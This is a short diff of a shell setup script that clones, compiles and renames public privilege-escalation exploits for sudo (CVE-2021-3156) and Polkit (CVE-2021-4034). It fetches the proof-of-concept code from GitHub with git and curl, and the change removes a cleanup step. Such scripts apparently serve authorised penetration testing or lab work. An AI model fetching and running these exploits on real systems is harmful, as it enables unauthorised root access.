@@ -22,7 +22,7 @@ sudo apt install -y libnftnl-dev libmnl-dev
 git clone https://github.com/blasty/CVE-2021-3156.git
 cd CVE-2021-3156 && make
 mv sudo-hax-me-a-sandwich ../CVE-2021-3156-exploit
-chmod +x ../CVE-2021-3156-exploit && cd ../ && rm -rf CVE-2021-3156
+chmod +x ../CVE-2021-3156-exploit && cd ../
 
 # Polkit - CVE-2021-4034
 curl -s https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c > CVE-2021-4034-exploit.c
